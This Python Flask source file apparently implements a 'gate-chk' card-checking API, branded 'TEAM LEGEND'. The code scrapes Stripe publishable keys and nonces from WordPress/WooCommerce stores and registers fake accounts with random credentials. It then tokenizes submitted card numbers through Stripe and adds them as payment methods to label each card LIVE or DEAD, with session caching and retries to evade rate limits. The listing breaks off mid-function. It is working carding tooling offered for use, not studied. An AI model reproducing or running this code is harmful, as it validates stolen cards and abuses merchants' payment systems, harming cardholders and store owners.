from flask import Flask, request, jsonify, make_response
from flask_cors import CORS
import requests
import json
import random
import string
import logging
import re
from datetime import datetime
import time
from urllib.parse import urlparse, urljoin
import uuid
import threading
from concurrent.futures import ThreadPoolExecutor
import urllib3
from collections import OrderedDict

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)
app.config['JSON_SORT_KEYS'] = False
CORS(app)

def json_response(data, status_code=200):
    """Create JSON response with preserved key order"""
    json_str = json.dumps(data, ensure_ascii=False, indent=2, sort_keys=False)
    logging.info(f"JSON Response Order Test: {json_str[:200]}")
    response = make_response(json_str, status_code)
    response.headers['Content-Type'] = 'application/json; charset=utf-8'
    return response

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%H:%M:%S'
)

STRIPE_GUID = '9296a736-8562-4d4f-a33b-1a436f4e812fbf2218'
STRIPE_MUID = '80adf712-fa93-441a-8b77-0d64c2589d350eedce'
STRIPE_SID = 'ed7085a5-8b79-41b8-9f7a-428975ab23a27dffa6'

# Job tracking
job_progress = {}
job_lock = threading.Lock()
executor = ThreadPoolExecutor(max_workers=10)

# Site session cache for fast checking
site_cache = {}
cache_lock = threading.Lock()
CACHE_EXPIRY = 1800  # 30 minutes


def update_job_progress(job_id, step_name, status, message):
    """Thread-safe progress update"""
    with job_lock:
        if job_id not in job_progress:
            job_progress[job_id] = {
                'steps': [],
                'status': 'processing',
                'result': None,
                'start_time': time.time()
            }
        
        job_progress[job_id]['steps'].append({
            'name': step_name,
            'status': status,
            'message': message,
            'timestamp': time.time()
        })


def get_job_status(job_id):
    """Get current job status"""
    with job_lock:
        return job_progress.get(job_id, None)


def complete_job(job_id, result):
    """Mark job as complete"""
    with job_lock:
        if job_id in job_progress:
            job_progress[job_id]['status'] = 'completed'
            job_progress[job_id]['result'] = result
            job_progress[job_id]['end_time'] = time.time()


def get_cached_session(site):
    """Get cached session for a site if available and valid"""
    with cache_lock:
        if site in site_cache:
            cached = site_cache[site]
            if time.time() - cached['timestamp'] < CACHE_EXPIRY:
                logging.info(f"✅ Using cached session for {site}")
                return cached['session'], cached['ajax_nonce'], cached['stripe_key']
            else:
                logging.info(f"⏰ Cache expired for {site}")
                del site_cache[site]
    return None, None, None


def cache_session(site, session, ajax_nonce, stripe_key):
    """Cache session data for a site"""
    with cache_lock:
        site_cache[site] = {
            'session': session,
            'ajax_nonce': ajax_nonce,
            'stripe_key': stripe_key,
            'timestamp': time.time()
        }
        logging.info(f"💾 Cached session for {site}")


def invalidate_cache(site):
    """Remove cached session for a site"""
    with cache_lock:
        if site in site_cache:
            del site_cache[site]
            logging.info(f"🗑️ Invalidated cache for {site}")


def is_session_expired_error(response_text, status_code):
    """Detect if error indicates expired session/nonce"""
    error_indicators = [
        'nonce',
        'expired',
        'unauthorized',
        'not logged in',
        'authentication',
        'session',
        'csrf',
        'invalid token',
        'please log in',
        'login required'
    ]
    
    if status_code in [401, 403]:
        return True
    
    text_lower = response_text.lower()
    return any(indicator in text_lower for indicator in error_indicators)


class SiteDetector:
    """Auto-detect site type and extract Stripe configuration."""
    
    def __init__(self, site_url):
        if not site_url.startswith(('http://', 'https://')):
            site_url = 'https://' + site_url
        
        self.site_url = site_url.rstrip('/')
        self.domain = urlparse(self.site_url).netloc
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
        })
        
    def detect_wordpress(self):
        """Detect if site is WordPress - Ultra fast detection."""
        urls_to_try = [self.site_url]
        
        # If HTTPS, also try HTTP as fallback
        if self.site_url.startswith('https://'):
            urls_to_try.append(self.site_url.replace('https://', 'http://'))
        
        for url in urls_to_try:
            try:
                logging.info(f"🔍 Checking WordPress on {url}")
                response = self.session.get(url, timeout=8, verify=False, allow_redirects=True)
                logging.info(f"✅ Site responded: HTTP {response.status_code}")
                
                text_lower = response.text.lower()
                indicators = [
                    '/wp-content/' in response.text,
                    '/wp-includes/' in response.text,
                    'wordpress' in text_lower,
                    'wp-json' in text_lower
                ]
                
                if any(indicators):
                    logging.info(f"✅ WordPress detected on {url}")
                    # Update site_url to working URL
                    self.site_url = url
                    return True
                
                logging.warning(f"⚠️ WordPress NOT detected on {url}")
                
            except requests.exceptions.Timeout:
                logging.error(f"❌ Timeout error accessing {url}")
            except requests.exceptions.SSLError as e:
                logging.warning(f"⚠️ SSL error on {url}, trying HTTP fallback...")
            except requests.exceptions.ConnectionError as e:
                logging.error(f"❌ Connection error on {url}: {str(e)[:100]}")
            except Exception as e:
                logging.error(f"❌ Error detecting WordPress on {url}: {type(e).__name__} - {str(e)[:100]}")
        
        return False
    
    def detect_woocommerce(self):
        """Detect if site uses WooCommerce - Ultra fast detection."""
        urls_to_try = [self.site_url]
        
        # If HTTPS, also try HTTP as fallback
        if self.site_url.startswith('https://'):
            urls_to_try.append(self.site_url.replace('https://', 'http://'))
        
        for url in urls_to_try:
            try:
                logging.info(f"🛒 Checking WooCommerce on {url}")
                response = self.session.get(url, timeout=8, verify=False, allow_redirects=True)
                html = response.text.lower()
                
                is_wc = 'woocommerce' in html or 'wc-ajax' in html
                
                if is_wc:
                    logging.info(f"✅ WooCommerce detected on {url}")
                    # Update site_url to working URL
                    self.site_url = url
                    return True
                
                logging.warning(f"⚠️ WooCommerce NOT detected on {url}")
                
            except requests.exceptions.Timeout:
                logging.error(f"❌ Timeout error accessing {url}")
            except requests.exceptions.SSLError as e:
                logging.warning(f"⚠️ SSL error on {url}, trying HTTP fallback...")
            except requests.exceptions.ConnectionError as e:
                logging.error(f"❌ Connection error on {url}: {str(e)[:100]}")
            except Exception as e:
                logging.error(f"❌ Error detecting WooCommerce on {url}: {type(e).__name__} - {str(e)[:100]}")
        
        return False
    
    def find_payment_pages(self):
        """Find payment-related pages."""
        pages = []
        paths = [
            '/my-account/',
            '/checkout/',
            '/cart/',
            '/my-account/payment-methods/',
            '/my-account/add-payment-method/'
        ]
        
        for path in paths:
            try:
                url = urljoin(self.site_url, path)
                r = self.session.get(url, timeout=10)
                if r.status_code == 200:
                    pages.append(url)
            except:
                pass
        
        return pages
    
    def extract_stripe_key(self):
        """Extract Stripe publishable key from site - Ultra fast."""
        logging.info(f"🔑 Extracting Stripe key from {self.site_url}")
        urls_to_check = [self.site_url, urljoin(self.site_url, '/my-account/'), urljoin(self.site_url, '/checkout/')]
        
        for url in urls_to_check:
            try:
                logging.info(f"  Checking: {url}")
                response = self.session.get(url, timeout=10, verify=False, allow_redirects=True)
                
                pk_match = re.search(r'(pk_(?:live|test)_[a-zA-Z0-9]{24,107})', response.text)
                if pk_match:
                    stripe_key = pk_match.group(1)
                    logging.info(f"✅ Stripe key found: {stripe_key[:20]}...")
                    return stripe_key
                        
            except Exception as e:
                logging.warning(f"  Failed to check {url}: {type(e).__name__}")
                continue
        
        logging.error(f"❌ No Stripe key found on {self.site_url}")
        return None
    
    def get_account_page(self):
        """Get my-account page URL."""
        paths = ['/my-account/', '/my-account', '/account/', '/customer/account/']
        
        for path in paths:
            try:
                url = urljoin(self.site_url, path)
                r = self.session.get(url, timeout=10)
                if r.status_code == 200:
                    return url
            except:
                pass
        
        return urljoin(self.site_url, '/my-account/')


def normalize_site_url(site_url):
    """Normalize site URL by adding scheme if missing."""
    if not site_url.startswith(('http://', 'https://')):
        site_url = 'https://' + site_url
    return site_url.rstrip('/')


def generate_random_credentials():
    """Generate random email and password for registration."""
    timestamp = int(time.time())
    random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    email = f"user{timestamp}{random_string}@gmail.com"
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    username = f"user{timestamp}{random_string}"
    return email, password, username


def register_account_dynamic(site_url):
    """Register a new account on any WordPress/WooCommerce site - Fast version."""
    site_url = normalize_site_url(site_url)
    session = requests.Session()
    email, password, username = generate_random_credentials()
    
    detector = SiteDetector(site_url)
    
    # Try alternative account page paths
    account_paths = [
        '/my-account/',
        '/my-account-2/',
        '/account/',
        '/customer/account/'
    ]
    
    account_url = None
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    }
    
    # Find working account page
    for path in account_paths:
        try:
            test_url = urljoin(site_url, path)
            test_resp = session.get(test_url, headers=headers, timeout=8)
            if test_resp.status_code == 200 and ('register' in test_resp.text.lower() or 'sign up' in test_resp.text.lower()):
                account_url = test_url
                logging.info(f"✓ Found account page: {path}")
                break
        except:
            continue
    
    if not account_url:
        account_url = detector.get_account_page()
    
    try:
        response = session.get(account_url, headers=headers, timeout=8)
        
        nonce = None
        nonce_patterns = [
            r'name="woocommerce-register-nonce"\s+value="([^"]+)"',
            r'name="_wpnonce"\s+value="([^"]+)"',
            r'name="register-nonce"\s+value="([^"]+)"'
        ]
        
        for pattern in nonce_patterns:
            match = re.search(pattern, response.text)
            if match:
                nonce = match.group(1)
                logging.info(f"Found nonce: {nonce[:10]}...")
                break
        
        referer_match = re.search(r'name="_wp_http_referer"\s+value="([^"]+)"', response.text)
        referer = referer_match.group(1) if referer_match else '/my-account/'
        
    except Exception as e:
        return False, None, None, f"Page fetch error: {e}"
    
    try:
        reg_data = {
            'username': username,
            'email': email,
            'password': password,
        }
        
        if nonce:
            reg_data['woocommerce-register-nonce'] = nonce
            reg_data['_wpnonce'] = nonce
        
        reg_data['_wp_http_referer'] = referer
        reg_data['register'] = 'Register'
        
        parsed_url = urlparse(account_url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        reg_headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': base_url,
            'Referer': account_url,
        }
        
        response = session.post(account_url, data=reg_data, headers=reg_headers, timeout=15, allow_redirects=True)
        
        cookies_dict = session.cookies.get_dict()
        has_login_cookie = any('wordpress_logged_in' in key for key in cookies_dict.keys())
        
        success_indicators = [
            has_login_cookie,
            'logout' in response.text.lower(),
            'dashboard' in response.url.lower(),
            'my-account' in response.url.lower() and 'register' not in response.url.lower(),
            'welcome' in response.text.lower() and len(response.text) > 1000
        ]
        
        if any(success_indicators):
            try:
                payment_urls = [
                    urljoin(base_url, '/my-account/add-payment-method/'),
                    urljoin(base_url, '/my-account/payment-methods/'),
                    urljoin(base_url, '/checkout/')
                ]
                
                ajax_nonce = None
                for payment_url in payment_urls:
                    try:
                        payment_page = session.get(payment_url, headers=headers, timeout=10)
                        
                        nonce_patterns = [
                            r'"createAndConfirmSetupIntentNonce"\s*:\s*"([a-f0-9]{10})"',
                            r'"nonce"\s*:\s*"([a-f0-9]{10})"',
                            r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"'
                        ]
                        
                        for pattern in nonce_patterns:
                            match = re.search(pattern, payment_page.text)
                            if match:
                                ajax_nonce = match.group(1)
                                break
                        
                        if ajax_nonce:
                            break
                    except:
                        continue
                
                final_nonce = ajax_nonce if ajax_nonce else '0746bbffaa'
                logging.info(f"Registration successful! Nonce: {final_nonce}")
                return True, session, final_nonce, "Registration successful"
            except Exception as e:
                return True, session, '0746bbffaa', "Registration successful (using default nonce)"
        else:
            return False, None, None, f"Registration failed - HTTP {response.status_code}"
            
    except Exception as e:
        return False, None, None, f"Registration error: {e}"


def get_stripe_payment_token(card_info: str, stripe_key: str):
    """Get Stripe payment token using auto-detected key."""
    try:
        card_number, exp_month, exp_year, cvc = card_info.replace(" ", "").split('|')
        exp_year = exp_year[-2:]
    except ValueError:
        return 'DEAD', "Invalid card format"

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en-IN;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    data = (
        f'type=card&card[number]={card_number}&card[cvc]={cvc}&card[exp_year]={exp_year}&card[exp_month]={exp_month}'
        '&allow_redisplay=unspecified'
        '&billing_details[address][country]=US'
        '&payment_user_agent=stripe.js%2F2a60804053%3B+stripe-js-v3%2F2a60804053%3B+payment-element%3B+deferred-intent'
        '&time_on_page=33763'
        f'&guid={STRIPE_GUID}&muid={STRIPE_MUID}&sid={STRIPE_SID}'
        f'&key={stripe_key}'
        '&_stripe_version=2024-06-20'
    )

    try:
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=10)
        response_data = response.json()
        
        if response.status_code == 200 and 'id' in response_data:
            return 'SUCCESS', response_data['id']
        else:
            error_message = response_data.get('error', {}).get('message', 'Unknown Stripe error')
            return 'DEAD', error_message

    except requests.exceptions.RequestException as e:
        return 'DEAD', str(e)


def add_card_to_website_dynamic(payment_method_id: str, session, ajax_nonce, site_url, retry_count=0):
    """Add card to any WordPress/WooCommerce site and check if LIVE or DEAD."""
    site_url = normalize_site_url(site_url)
    parsed_url = urlparse(site_url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    
    logging.info(f"💳 Adding card to {base_url}")
    
    # Try multiple payment page paths
    payment_paths = [
        '/my-account/add-payment-method/',
        '/my-account-2/add-payment-method/',
        '/my-account/payment-methods/add/',
        '/checkout/'
    ]
    
    ajax_action = 'wc_stripe_create_and_confirm_setup_intent'
    legacy_actions = [
        'wc_stripe_create_setup_intent',
        'wc_stripe_create_payment_method',
        'wc_stripe_add_payment_method'
    ]
    
    page_text = ""
    payment_url = urljoin(base_url, payment_paths[0])
    
    # Find working payment page
    for path in payment_paths:
        try:
            test_url = urljoin(base_url, path)
            headers = {
                'authority': parsed_url.netloc,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'accept-language': 'en-US,en-IN;q=0.9,en;q=0.8',
                'referer': urljoin(base_url, '/my-account/'),
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            }
            payment_page = session.get(test_url, headers=headers, timeout=15)
            if payment_page.status_code == 200 and ('stripe' in payment_page.text.lower() or 'payment' in payment_page.text.lower()):
                page_text = payment_page.text
                payment_url = test_url
                logging.info(f"✓ Found payment page: {path}")
                break
        except:
            continue
    
    if not page_text:
        # Fallback to default
        try:
            headers = {
                'authority': parsed_url.netloc,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'accept-language': 'en-US,en-IN;q=0.9,en;q=0.8',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            }
            payment_page = session.get(urljoin(base_url, '/my-account/add-payment-method/'), timeout=10)
            page_text = payment_page.text
        except:
            pass
    
    headers = {
        'authority': parsed_url.netloc,
        'accept': '*/*',
        'accept-language': 'en-US,en-IN;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': base_url,
        'referer': payment_url,
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    
    try:
        
        # Try multiple nonce extraction patterns
        nonce_patterns = [
            (r'"createAndConfirmSetupIntentNonce"\s*:\s*"([a-f0-9]{10})"', 'wc_stripe_create_and_confirm_setup_intent'),
            (r'"add_card_nonce"\s*:\s*"([a-f0-9]{10})"', 'wc_stripe_create_setup_intent'),
            (r'"createSetupIntentNonce"\s*:\s*"([a-f0-9]{10})"', 'wc_stripe_create_setup_intent'),
            (r'"createPaymentMethodNonce"\s*:\s*"([a-f0-9]{10})"', 'wc_stripe_create_payment_method'),
            (r'"nonce"\s*:\s*"([a-f0-9]{10})"', 'wc_stripe_create_and_confirm_setup_intent'),
        ]
        
        for pattern, action in nonce_patterns:
            nonce_match = re.search(pattern, page_text)
            if nonce_match:
                ajax_nonce = nonce_match.group(1)
                ajax_action = action
                logging.info(f"✓ Found nonce: {ajax_nonce[:6]}... for action: {ajax_action}")
                break
        
        # Try from wc_stripe_params if not found yet
        if not ajax_nonce:
            wc_params_match = re.search(r'var\s+wc_stripe_params\s*=\s*(\{[^;]+\});', page_text)
            if wc_params_match:
                try:
                    params_str = wc_params_match.group(1)
                    for pattern, action in nonce_patterns:
                        nonce_match = re.search(pattern, params_str)
                        if nonce_match:
                            ajax_nonce = nonce_match.group(1)
                            ajax_action = action
                            logging.info(f"✓ Extracted from params: {ajax_nonce[:6]}...")
                            break
                except:
                    pass
    except:
        logging.warning(f"⚠ Using default nonce")
        pass
    
    data = {
        'action': ajax_action,
        'wc-stripe-payment-method': payment_method_id,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': ajax_nonce,
    }
    
    # Add extra parameters based on action type
    if ajax_action == 'wc_stripe_create_and_confirm_setup_intent':
        data['is_woopay_preflight_check'] = '0'
        data['payment_method'] = payment_method_id
    elif ajax_action == 'wc_stripe_create_setup_intent':
        data['stripe_source_id'] = payment_method_id
        data['nonce'] = ajax_nonce
    
    logging.info(f"Using action: {ajax_action}")

    try:
        response = session.post(
            urljoin(base_url, '/wp-admin/admin-ajax.php'),
            headers=headers, data=data, timeout=15
        )
        response_text = response.text
        
        logging.info(f"Card check response: HTTP {response.status_code}")
        logging.info(f"Response preview: {response_text[:200]}")

        if response.status_code in [429, 503] and retry_count < 2:
            time.sleep(random.uniform(8, 12))
            return add_card_to_website_dynamic(payment_method_id, session, ajax_nonce, site_url, retry_count + 1)

        if response.status_code == 200:
            response_lower = response_text.lower()
            
            # Parse JSON response first
            try:
                json_response = response.json()
                if json_response.get('success') == True:
                    data = json_response.get('data', {})
                    status = data.get('status', '')
                    
                    # Check Stripe setup intent status
                    if status == 'succeeded':
                        logging.info("✅ SUCCESS - Payment method added successfully!")
                        return 'SUCCESS', "Payment method added successfully"
                    
                    if status == 'requires_action' or status == 'requires_source_action':
                        logging.info("✅ SUCCESS - Card Valid, needs authentication")
                        return 'SUCCESS', "Card Valid - 3D Secure Required ✓"
                    
                    if status == 'requires_payment_method':
                        logging.info("❌ DEAD - Card Declined")
                        return 'DEAD', "Card Declined by Bank"
            except:
                pass
            
            # Fallback text-based detection
            if '"success":true' in response_text and '"status":"succeeded"' in response_text:
                logging.info("✅ SUCCESS - Card successfully added!")
                return 'SUCCESS', "Payment method added successfully"
            
            if 'succeeded' in response_lower and 'setup_intent' in response_lower:
                logging.info("✅ SUCCESS - Setup Intent Succeeded!")
                return 'SUCCESS', "Card Verified ✓"
            
            # 3D SECURE / CVV CASES  
            if 'does not support this type of purchase' in response_lower:
                logging.info("✅ Card Valid - Does not support this type")
                return 'SUCCESS', "Your card does not support this type of purchase."
            
            if 'requires_action' in response_lower or 'authentication_required' in response_lower:
                logging.info("✅ Card Valid - 3D Secure")
                return 'SUCCESS', "Card Valid - 3D Secure Required ✓"
            
            # RATE LIMIT
            if 'cannot add a new payment method so soon' in response_lower or 'try again later' in response_lower:
                logging.warning("⏳ Rate Limited")
                return 'RATE_LIMIT', "Too many requests - Try later"
            
            # PARSE JSON ERRORS
            try:
                error_data = response.json()
                
                # Check success field
                if error_data.get('success') == False:
                    error_info = error_data.get('data', {})
                    error_msg = error_info.get('error', {}).get('message', '')
                    error_code = error_info.get('error', {}).get('code', '')
                    
                    logging.info(f"❌ Error Code: {error_code}, Message: {error_msg}")
                    
                    # Specific error codes
                    if 'insufficient_funds' in error_code or 'insufficient' in error_msg.lower():
                        return 'SUCCESS', "Insufficient funds"
                    
                    if 'does not support this type of purchase' in error_msg.lower():
                        return 'SUCCESS', error_msg
                    
                    if 'card_declined' in error_code or 'declined' in error_msg.lower():
                        return 'DEAD', error_msg
                    
                    if 'incorrect_cvc' in error_code or 'incorrect cvc' in error_msg.lower():
                        return 'DEAD', error_msg
                    
                    if 'expired' in error_code or 'expired' in error_msg.lower():
                        return 'DEAD', error_msg
                    
                    if 'invalid' in error_code or 'invalid' in error_msg.lower():
                        return 'DEAD', error_msg
                    
                    # Generic decline
                    if error_msg:
                        return 'DEAD', error_msg
                
            except json.JSONDecodeError:
                pass
            
            # TEXT-BASED ERROR DETECTION
            if 'decline' in response_lower or 'declined' in response_lower:
                logging.info("❌ Card Declined (text match)")
                return 'DEAD', "Card Declined by Bank"
            
            if 'invalid' in response_lower:
                return 'DEAD', "Invalid Card"
            
            if 'expired' in response_lower:
                return 'DEAD', "Card Expired"
            
            # Unknown but not success
            logging.warning(f"⚠ Unknown response: {response_text[:150]}")
            return 'DEAD', "Check Failed - Unknown Response"
        
        # NON-200 STATUS CODES
        if response.status_code == 400:
            logging.info(f"Card check response: HTTP 400")
            logging.info(f"Response preview: {response_text[:200]}")
            try:
                error_data = response.json()
                error_msg = error_data.get('data', {}).get('error', {}).get('message', '')
                if not error_msg:
                    error_msg = error_data.get('message', 'Bad Request')
                
                if 'nonce' in error_msg.lower() or 'invalid' in error_msg.lower():
                    logging.warning("⚠️ Nonce/validation error - retrying with fresh nonce")
                    return 'DEAD', f"Site Security Error: {error_msg}"
                
                return 'DEAD', f"Site Error: {error_msg}"
            except:
                if response_text and len(response_text) > 0:
                    if response_text.strip() == '0' or response_text.strip() == '-1':
                        if retry_count == 0:
                            logging.warning(f"⚠️ Got '{response_text.strip()}' response - trying all actions")
                            
                            # Try all possible actions systematically
                            all_actions = [ajax_action] + legacy_actions
                            all_actions = list(dict.fromkeys(all_actions))  # Remove duplicates while preserving order
                            
                            for try_action in all_actions:
                                if try_action == ajax_action:
                                    continue  # Skip the one we just tried
                                    
                                logging.info(f"Attempting: {try_action}")
                                retry_data = {
                                    'action': try_action,
                                    'wc-stripe-payment-method': payment_method_id,
                                    'wc-stripe-payment-type': 'card',
                                    '_ajax_nonce': ajax_nonce,
                                }
                                
                                # Add action-specific parameters
                                if try_action == 'wc_stripe_create_and_confirm_setup_intent':
                                    retry_data['is_woopay_preflight_check'] = '0'
                                    retry_data['payment_method'] = payment_method_id
                                elif try_action == 'wc_stripe_create_setup_intent':
                                    retry_data['stripe_source_id'] = payment_method_id
                                    retry_data['nonce'] = ajax_nonce
                                
                                try:
                                    retry_response = session.post(
                                        urljoin(base_url, '/wp-admin/admin-ajax.php'),
                                        headers=headers, data=retry_data, timeout=15
                                    )
                                    if retry_response.text.strip() not in ['0', '-1', '']:
                                        logging.info(f"✓ Action {try_action} worked! Response: {retry_response.text[:100]}")
                                        # Parse this successful response
                                        try:
                                            json_resp = retry_response.json()
                                            if json_resp.get('success') == True:
                                                return 'LIVE', "Payment method added successfully"
                                            else:
                                                error_msg = json_resp.get('data', {}).get('error', {}).get('message', 'Unknown error')
                                                if 'insufficient' in error_msg.lower():
                                                    return 'LIVE', "Insufficient Funds - Card Valid ✓"
                                                return 'DEAD', error_msg
                                        except:
                                            if 'success' in retry_response.text.lower() and 'true' in retry_response.text.lower():
                                                return 'LIVE', "Payment method added successfully"
                                            pass
                                except Exception as retry_err:
                                    logging.warning(f"⚠️ Action {try_action} failed: {retry_err}")
                                    continue
                        
                        return 'DEAD', "Site Configuration Error - Payment Gateway Not Properly Setup"
                    return 'DEAD', f"Bad Request - Response: {response_text[:50]}"
                return 'DEAD', "Bad Request - Site Error"
        
        return 'DEAD', f"HTTP {response.status_code}"

    except requests.exceptions.Timeout:
        logging.error("⏱ Timeout")
        return 'DEAD', "Request Timeout"
    except requests.exceptions.RequestException as e:
        logging.error(f"🔴 Request Error: {e}")
        return 'DEAD', f"Error: {str(e)[:50]}"


@app.route('/key-<api_key>/gate-chk/cc=<path:cc>&site=<path:site>', methods=['GET'])
def check_card_with_key(api_key, cc, site):
    """Smart API endpoint - automatically uses cache for ultra-fast checks (1-6 sec)."""
    
    if api_key != '@teamlegendno1':
        return jsonify({
            'status': 'error',
            'message': 'Invalid API key'
        }), 401
    
    if not cc or not site:
        return jsonify({
            'status': 'error',
            'message': 'CC and site parameters required. Format: /key-@teamlegendno1/gate-chk/cc=CARD|MM|YY|CVV&site=https://example.com'
        }), 400
    
    start_time = time.time()
    steps = []
    cached = False
    
    try:
        card_parts = cc.split('|')
        card_display = cc  # Show full card
    except:
        card_display = cc
    
    session, ajax_nonce, stripe_key = get_cached_session(site)
    
    if session and ajax_nonce and stripe_key:
        cached = True
        logging.info(f"⚡ Using cached session for {site} - FAST MODE")
        
        steps.append({
            'step': 1,
            'name': 'Cache Hit',
            'status': 'success',
            'message': f'Using cached session for {site} ✓'
        })
    else:
        logging.info(f"🔄 No cache for {site} - FULL SETUP MODE")
        
        steps.append({
            'step': 1,
            'name': 'Site Detection',
            'status': 'processing',
            'message': f'Detecting site: {site}'
        })
        
        detector = SiteDetector(site)
        is_wp = detector.detect_wordpress()
        is_wc = detector.detect_woocommerce()
        
        if not is_wp or not is_wc:
            steps[-1]['status'] = 'failed'
            steps[-1]['message'] = f'Not a WordPress/WooCommerce site'
            return jsonify({
                'CC': card_display,
                'Status': 'DEAD',
                'Response': 'Site not compatible',
                'Cached': False,
                'Time': round(time.time() - start_time, 2),
                'Dev': 'ADITYA X ⚡TEAM LEGEND'
            })
        
        steps[-1]['status'] = 'success'
        steps[-1]['message'] = f'WordPress/WooCommerce detected ✓'
        
        steps.append({
            'step': 2,
            'name': 'Stripe Key Extraction',
            'status': 'processing',
            'message': 'Extracting Stripe public key...'
        })
        
        stripe_key = detector.extract_stripe_key()
        
        if not stripe_key:
            steps[-1]['status'] = 'failed'
            steps[-1]['message'] = 'No Stripe key found on site'
            return jsonify({
                'CC': card_display,
                'Status': 'DEAD',
                'Response': 'Stripe key not found',
                'Cached': False,
                'Time': round(time.time() - start_time, 2),
                'Dev': 'ADITYA X ⚡TEAM LEGEND'
            })
        
        steps[-1]['status'] = 'success'
        steps[-1]['message'] = f'Stripe key found: {stripe_key[:15]}...'
        
        steps.append({
            'step': 3,
            'name': 'Account Registration',
            'status': 'processing',
            'message': 'Registering new account...'
        })
        
        reg_success, session, ajax_nonce, reg_msg = register_account_dynamic(site)
        
        if not reg_success:
            steps[-1]['status'] = 'failed'
            steps[-1]['message'] = f'Registration failed: {reg_msg}'
            return jsonify({
                'CC': card_display,
                'Status': 'DEAD',
                'Response': 'Registration failed',
                'Cached': False,
                'Time': round(time.time() - start_time, 2),
                'Dev': 'ADITYA X ⚡TEAM LEGEND'
            })
        
        steps[-1]['status'] = 'success'
        steps[-1]['message'] = 'Account created successfully ✓'
    
    steps.append({
        'step': 4,
        'name': 'Stripe Token',
        'status': 'processing',
        'message': 'Getting Stripe payment token...'
    })
    
    token_status, token_or_msg = get_stripe_payment_token(cc, stripe_key)
    
    if token_status == 'DEAD':
        steps[-1]['status'] = 'failed'
        steps[-1]['message'] = token_or_msg
        return jsonify({
            'CC': card_display,
            'Status': 'DEAD',
            'Response': token_or_msg,
            'Cached': cached,
            'Time': round(time.time() - start_time, 2),
            'Dev': 'ADITYA X ⚡TEAM LEGEND'
        })
    
    pm_token = token_or_msg
    steps[-1]['status'] = 'success'
    steps[-1]['message'] = f'Token received: {pm_token[:20]}...'
    
    steps.append({
        'step': 5,
        'name': 'Payment Method',
        'status': 'processing',
        'message': 'Adding payment method to account...'
    })
    
    website_status, website_msg = add_card_to_website_dynamic(pm_token, session, ajax_nonce, site)
    
    if website_status == 'DEAD' and 'nonce' in website_msg.lower() and cached:
        logging.warning(f"⚠️ Session expired for {site}, auto-refreshing...")
        invalidate_cache(site)
        
        steps.append({
            'step': 6,
            'name': 'Session Refresh',
            'status': 'processing',
            'message': 'Session expired - refreshing...'
        })
        
        reg_success, session, ajax_nonce, reg_msg = register_account_dynamic(site)
        if reg_success:
            cache_session(site, session, ajax_nonce, stripe_key)
            website_status, website_msg = add_card_to_website_dynamic(pm_token, session, ajax_nonce, site)
            steps[-1]['status'] = 'success'
            steps[-1]['message'] = 'Session refreshed ✓'
        else:
            steps[-1]['status'] = 'failed'
            steps[-1]['message'] = 'Session refresh failed'
    
    # Cache session if we got a valid response from the site (SUCCESS, DEAD, etc.)
    # Even if card is dead, the session is still valid for future checks!
    # Don't cache only if there was a session/nonce error
    if not cached and session and ajax_nonce and stripe_key and 'nonce' not in website_msg.lower():
        cache_session(site, session, ajax_nonce, stripe_key)
        logging.info(f"💾 Cached session for future fast checks on {site} (Status: {website_status})")
    
    steps[-1]['status'] = 'success' if website_status == 'SUCCESS' else ('warning' if website_status == 'RATE_LIMIT' else 'failed')
    steps[-1]['message'] = website_msg
    
    response_data = OrderedDict([
        ('CC', card_display),
        ('Status', website_status),
        ('Response', website_msg),
        ('Cached', cached),
        ('Time', round(time.time() - start_time, 2)),
        ('Dev', 'ADITYA X ⚡TEAM LEGEND')
    ])
    
    # Don't add steps - keep response clean
    return json_response(response_data)


def background_check_card(job_id, api_key, site, cc):
    """Background worker for checking card with real-time progress updates"""
    try:
        start_time = time.time()
        
        # Step 1: Site Detection
        update_job_progress(job_id, 'Site Detection', 'processing', f'Detecting site: {site}')
        
        detector = SiteDetector(site)
        is_wp = detector.detect_wordpress()
        is_wc = detector.detect_woocommerce()
        
        if not is_wp or not is_wc:
            update_job_progress(job_id, 'Site Detection', 'failed', 'Not a WordPress/WooCommerce site')
